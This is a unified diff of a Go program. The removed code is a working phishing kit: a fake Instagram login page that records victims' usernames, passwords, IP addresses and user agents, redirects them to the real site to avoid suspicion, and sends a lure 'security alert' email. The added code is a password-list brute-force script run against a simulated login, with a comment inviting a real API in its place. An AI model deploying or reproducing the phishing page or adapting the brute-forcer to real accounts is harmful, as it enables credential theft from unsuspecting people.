@@ -1,169 +1,146 @@
 package main
 
 import (
+    "bufio"
     "database/sql"
     "fmt"
-    "html/template"
     "log"
-    "net/http"
     "os"
+    "strings"
     "time"
-    "net/smtp" 
-    "github.com/google/uuid"
-    "github.com/jordan-wright/email"
+
     _ "github.com/mattn/go-sqlite3"
 )
 
-// LoginData struct to store form data
-type LoginData struct {
-    ID        int
-    Username  string
+// Attempt struct to store brute force attempt details
+type Attempt struct {
     Password  string
-    IP        string
-    UserAgent string
     Timestamp string
-    SessionID string
+    Success   bool
 }
 
-// HTML template for fake Instagram login page
-const loginTemplate = `
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Instagram Login</title>
-    <style>
-        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fafafa; }
-        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); width: 350px; text-align: center; }
-        h2 { color: #262626; font-size: 24px; margin-bottom: 20px; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 14px; }
-        input[type="submit"] { background: #0095f6; color: white; padding: 12px; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 16px; }
-        input[type="submit"]:hover { background: #0074cc; }
-        .error { color: red; font-size: 14px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2>Instagram Login</h2>
-        <form action="/login" method="POST">
-            <input type="hidden" name="csrf_token" value="{{.CSRFToken}}">
-            <input type="text" name="username" placeholder="Username" required><br>
-            <input type="password" name="password" placeholder="Password" required><br>
-            <input type="submit" value="Log In">
-        </form>
-    </div>
-</body>
-</html>
-`
+// simulateLogin simulates checking a password (replace with real API in controlled tests)
+func simulateLogin(password string) bool {
+    // For simulation, assume the correct password is "secret123"
+    const correctPassword = "secret123"
+    return password == correctPassword
+}
+
+// readPasswords reads passwords from password.txt
+func readPasswords(filename string) ([]string, error) {
+    file, err := os.Open(filename)
+    if err != nil {
+        return nil, fmt.Errorf("error opening %s: %v", filename, err)
+    }
+    defer file.Close()
+
+    var passwords []string
+    scanner := bufio.NewScanner(file)
+    for scanner.Scan() {
+        password := strings.TrimSpace(scanner.Text())
+        if password != "" {
+            passwords = append(passwords, password)
+        }
+    }
+    if err := scanner.Err(); err != nil {
+        return nil, fmt.Errorf("error reading %s: %v", filename, err)
+    }
+    return passwords, nil
+}
+
+// initDatabase initializes SQLite database
+func initDatabase() (*sql.DB, error) {
+    db, err := sql.Open("sqlite3", "./password_attempts.db")
+    if err != nil {
+        return nil, fmt.Errorf("error connecting to database: %v", err)
+    }
+
+    // Create table for storing attempts
+    _, err = db.Exec(`
+        CREATE TABLE IF NOT EXISTS attempts (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            password TEXT,
+            timestamp TEXT,
+            success BOOLEAN
+        )`)
+    if err != nil {
+        db.Close()
+        return nil, fmt.Errorf("error creating table: %v", err)
+    }
+    return db, nil
+}
+
+// logAttempt logs an attempt to the database
+func logAttempt(db *sql.DB, password, timestamp string, success bool) error {
+    _, err := db.Exec(
+        "INSERT INTO attempts (password, timestamp, success) VALUES (?, ?, ?)",
+        password, timestamp, success)
+    if err != nil {
+        return fmt.Errorf("error logging attempt: %v", err)
+    }
+    return nil
+}
+
+// bruteForceAttack performs the brute force attack
+func bruteForceAttack(passwords []string, db *sql.DB, logger *log.Logger) (string, bool) {
+    for i, password := range passwords {
+        timestamp := time.Now().Format(time.RFC3339)
+        fmt.Printf("Attempt %d: Trying password: %s\n", i+1, password)
+        logger.Printf("Attempt %d: Password: %s, Timestamp: %s", i+1, password, timestamp)
+
+        // Simulate rate-limiting delay
+        time.Sleep(500 * time.Millisecond)
+
+        // Check password
+        success := simulateLogin(password)
+
+        // Log to database
+        if err := logAttempt(db, password, timestamp, success); err != nil {
+            log.Printf("Error logging attempt: %v", err)
+        }
+
+        if success {
+            logger.Printf("Success: Password found: %s", password)
+            return password, true
+        }
+    }
+    logger.Println("Password not found in the provided list")
+    return "", false
+}
 
 func main() {
-    // Initialize SQLite database
-    db, err := sql.Open("sqlite3", "./phishing_log.db")
+    // Initialize log file
+    logFile, err := os.OpenFile("brute_force.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
     if err != nil {
-        log.Fatal("Error connecting to database:", err)
+        log.Fatalf("Error opening log file: %v", err)
+    }
+    defer logFile.Close()
+    logger := log.New(logFile, "BRUTE_FORCE: ", log.LstdFlags)
+
+    // Initialize database
+    db, err := initDatabase()
+    if err != nil {
+        log.Fatalf("Error initializing database: %v", err)
     }
     defer db.Close()
 
-    // Create table for storing login attempts
-    _, err = db.Exec(`
-        CREATE TABLE IF NOT EXISTS logins (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            username TEXT,
-            password TEXT,
-            ip TEXT,
-            user_agent TEXT,
-            timestamp TEXT,
-            session_id TEXT
-        )`)
+    // Read passwords from file
+    passwords, err := readPasswords("password.txt")
     if err != nil {
-        log.Fatal("Error creating table:", err)
+        log.Fatalf("Error reading passwords: %v", err)
     }
 
-    // Initialize log file
-    logFile, err := os.OpenFile("phishing_attempts.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-    if err != nil {
-        log.Fatal("Error opening log file:", err)
-    }
-    defer logFile.Close()
-    logger := log.New(logFile, "PHISHING: ", log.LstdFlags)
+    fmt.Printf("Starting brute force attack with %d passwords\n", len(passwords))
+    startTime := time.Now()
 
-    // Define routes
-    http.HandleFunc("/", loginPage)
-    http.HandleFunc("/login", handleLogin(db, logger))
+    // Run brute force attack
+    foundPassword, success := bruteForceAttack(passwords, db, logger)
 
-    // Start server
-    fmt.Println("Server running on port 8080...")
-    log.Fatal(http.ListenAndServe(":8080", nil))
-}
-
-// loginPage handles the display of the fake login page
-func loginPage(w http.ResponseWriter, r *http.Request) {
-    t, err := template.New("login").Parse(loginTemplate)
-    if err != nil {
-        http.Error(w, "Error loading page", http.StatusInternalServerError)
-        return
+    if success {
+        fmt.Printf("Success: Password found: %s\n", foundPassword)
+    } else {
+        fmt.Println("Failed: Password not found in the provided list")
     }
 
-    // Generate CSRF token (simulated for realism)
-    csrfToken := uuid.New().String()
-    data := struct {
-        CSRFToken string
-    }{CSRFToken: csrfToken}
-
-    t.Execute(w, data)
-}
-
-// handleLogin processes form submissions
-func handleLogin(db *sql.DB, logger *log.Logger) http.HandlerFunc {
-    return func(w http.ResponseWriter, r *http.Request) {
-        if r.Method != http.MethodPost {
-            http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
-            return
-        }
-
-        // Parse form data
-        username := r.FormValue("username")
-        password := r.FormValue("password")
-        ip := r.RemoteAddr
-        userAgent := r.UserAgent()
-        timestamp := time.Now().Format(time.RFC3339)
-        sessionID := uuid.New().String()
-
-        // Log to file
-        logger.Printf("Username: %s, Password: %s, IP: %s, User-Agent: %s, SessionID: %s", username, password, ip, userAgent, sessionID)
-
-        // Store in database
-        _, err := db.Exec(
-            "INSERT INTO logins (username, password, ip, user_agent, timestamp, session_id) VALUES (?, ?, ?, ?, ?, ?)",
-            username, password, ip, userAgent, timestamp, sessionID)
-        if err != nil {
-            logger.Println("Error storing data:", err)
-            http.Error(w, "Server error", http.StatusInternalServerError)
-            return
-        }
-
-        // Send phishing email (simulated)
-        err = sendPhishingEmail(username)
-        if err != nil {
-            logger.Println("Error sending email:", err)
-        }
-
-        // Redirect to real Instagram to avoid suspicion
-        http.Redirect(w, r, "https://www.instagram.com", http.StatusFound)
-    }
-}
-
-// sendPhishingEmail sends a fake phishing email
-func sendPhishingEmail(username string) error {
-    e := email.NewEmail()
-    e.From = "no-reply@fake-instagram.com"
-    e.To = []string{username + "@example.com"} // Replace with real email in controlled tests
-    e.Subject = "Security Alert: Suspicious Login Attempt"
-    e.Text = []byte("Someone tried to log into your Instagram account. Click here to verify your identity: http://fake-instagram.com/verify")
-
-    // SMTP configuration (replace with your SMTP server details)
-    err := e.Send("smtp.gmail.com:587", smtp.PlainAuth("", "your-email@gmail.com", "your-app-password", "smtp.gmail.com"))
-    if err != nil {
-        return err
-    }
-    return nil
+    fmt.Printf("Time taken: %v\n", time.Since(startTime))
 }
